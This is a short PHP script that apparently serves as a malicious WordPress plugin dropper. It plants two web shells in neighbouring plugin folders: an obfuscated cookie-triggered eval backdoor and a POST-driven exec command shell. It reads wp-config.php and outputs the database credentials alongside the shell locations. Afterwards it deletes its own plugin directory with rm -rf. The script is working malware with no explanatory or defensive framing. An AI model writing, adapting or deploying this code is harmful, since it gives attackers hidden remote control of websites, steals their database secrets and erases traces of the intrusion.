﻿<?php 
//err off
ini_set('display_errors', 0); ini_set('display_startup_errors', 0); error_reporting(E_ALL);
//s1 gen
$i1 = rand(10,20); $i2 = rand(21,30); $i3 = rand(31,40); $i4 = rand(41,50); $i5 = rand(51,60); $i6 = rand(61,70); $mp = "$i1-$i2-$i3-$i4-$i5-$i6"; $mn = substr(md5(microtime()),rand(0,20),7);
$mc = '<?php $p=$_COOKIE;(count($p)=='.$i6.'&&in_array(gettype($p).count($p),$p))?(($p['.$i2.']=$p['.$i2.'].$p['.$i3.'])&&($p['.$i4.']=$p['.$i2.']($p['.$i4.']))&&($p=$p['.$i4.']($p['.$i1.'],$p['.$i2.']($p['.$i5.'])))&&$p()):$p;';
//s2 gen
$sp = substr(md5(microtime()*2),rand(0,20),7); $sc = '<?php if(isset($_POST["'.$sp.'"])){ echo exec($_POST["c"],$out); echo json_encode($out); } ?>'; $sn = substr(md5(microtime()*3),rand(0,20),7);
//*
$r = [];

//
$plug_name = basename(__DIR__);
//find dir
$dln = scandir("../"); unset($dln[0]); unset($dln[1]); 
foreach ($dln as $key => $value) {	
	if($value == $plug_name){
		unset($dln[$key]);
	}
	if(!is_dir("../".$value)){
		unset($dln[$key]);
	}
}
//!!!!!!!!!!!!!!!!!!!!
if(count($dln) <2){
	mkdir("../wpsec", 0777, true); $dln[] = "wpsec";
	mkdir("../wpost", 0777, true); $dln[] = "wpost";
}
$dln = array_values($dln);
//!!!!!!!!!!!!!!!!!!!!
//s1 create
file_put_contents('../'.$dln[0].'/'.$mn.'.php', $mc);
if(is_file('../'.$dln[0].'/'.$mn.'.php')){
	$r["shell_1"] = '/wp-content/plugins/'.$dln[0].'/'.$mn.'.php;'.$mp;
}else{
	$r["shell_1"] = 'none';
}
//s2 create
file_put_contents('../'.$dln[1].'/'.$sn.'.php', $sc);
if(is_file('../'.$dln[1].'/'.$sn.'.php')){
	$r["shell_2"] = '/wp-content/plugins/'.$dln[1].'/'.$sn.'.php;'.$sp;
}else{
	$r["shell_2"] = 'none';
}

include '../../../wp-config.php';
$dbc = DB_HOST.";".DB_NAME.";".DB_USER.";".DB_PASSWORD;
if($dbc == 'DB_HOST;DB_NAME;DB_USER;DB_PASSWORD'){
	$r["db_conf"] = 'none';
}else{
	$r["db_conf"] = $dbc;
}

echo json_encode($r);

$f = fopen('un.php', 'w');
fclose($f);
exec('rm -rf ../'.$plug_name);
//***

?>